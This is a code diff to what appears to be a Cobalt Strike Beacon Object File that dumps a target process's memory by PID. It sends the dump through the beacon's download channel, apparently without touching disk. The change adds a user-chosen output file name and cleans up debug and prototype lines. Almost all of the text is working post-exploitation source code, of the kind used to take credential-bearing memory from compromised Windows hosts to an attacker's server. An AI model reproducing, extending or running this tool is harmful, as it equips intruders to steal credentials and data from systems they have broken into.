@@ -11,7 +11,8 @@
 WINBASEAPI void WINAPI MSVCRT$srand(int initial);
 WINBASEAPI int WINAPI MSVCRT$rand();
 WINBASEAPI time_t WINAPI MSVCRT$time(time_t *time);
-WINBASEAPI void WINAPI MSVCRT$sprintf(char*, char[], int);
+//WINBASEAPI void WINAPI MSVCRT$sprintf(char*, char[], int);
+WINBASEAPI void WINAPI MSVCRT$sprintf(char*, char[], ...);
 
 void downloadFile(char fileName[], int fileNameLength, char fileData[], int fileLength) {
 
@@ -141,7 +142,6 @@ void downloadFile(char fileName[], int fileNameLength, char fileData[], int file
         // then a byte for the good-measure null byte to be included
         // then lastly is the 4-byte int of the fileLength
         int chunkLength = 4 + fileLength;
-        BeaconPrintf(CALLBACK_OUTPUT, "chunkLength: %d", chunkLength);
 
         char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
         // pack on fileId as 4-byte int first
@@ -780,6 +780,7 @@ void go(char* args, int length) {
 	BeaconDataParse(&parser, args, length);
 	PID = BeaconDataInt(&parser);
 	outputFile = BeaconDataExtract(&parser, NULL);
+    int outputFileLength = BeaconDataInt(&parser);
 	
 	//Declare variables
 	void* returnData = NULL;
@@ -918,12 +919,13 @@ void go(char* args, int length) {
 	
 	/*Note: At this point returnData holds our memory dump -> You could choose to encrypt it, compress it, write it to disk somwhere, whatever.  You do you*/
 
-    // The format will be "Mem:\[pid].dmp" so our length will be 5(mem:\) + count + 4(.dmp)
+    // If no output name is provided, the format will be "Mem:\[pid].dmp" so our length will be 5(mem:\) + count + 4(.dmp)
 
     /* Run loop till num is greater than 0 */
     int count = 0;
     int tempPid = PID;
-
+    int fileNameLength;
+    char* fileName;
     do
     {
         /* Increment digit count */
@@ -933,18 +935,25 @@ void go(char* args, int length) {
         tempPid /= 10;
     } while(tempPid != 0);
 
-    int fileNameLength = count + 9;
-    char* fileName = (char*) MSVCRT$malloc(fileNameLength);
-    MSVCRT$sprintf(fileName, "mem:\\%d.dmp", PID);
-    //BeaconPrintf(CALLBACK_OUTPUT, "fileName: %s", fileName);
+
+    if(!outputFile) {
+        // No name was provided, so we will use the pid as the basename
+        fileNameLength = count + 9;
+        fileName = (char*) MSVCRT$malloc(fileNameLength);
+        MSVCRT$sprintf(fileName, "mem:\\%d.dmp", PID);
+    } else {
+        // User provided a name to use for output
+        fileNameLength = outputFileLength + 9;
+        fileName = (char*) MSVCRT$malloc(fileNameLength);
+        MSVCRT$sprintf(fileName, "mem:\\%s.dmp", outputFile);
+    }
 
 	downloadFile(fileName, fileNameLength, returnData, fileSize);
+
     //Close Handles
     status = NtClose(hProc);
     status = NtClose(tFile);
     status = NtClose(hFile);
     
-    //Free memory
-    //MSVCRT$free(baseAddress);
     return;
 }
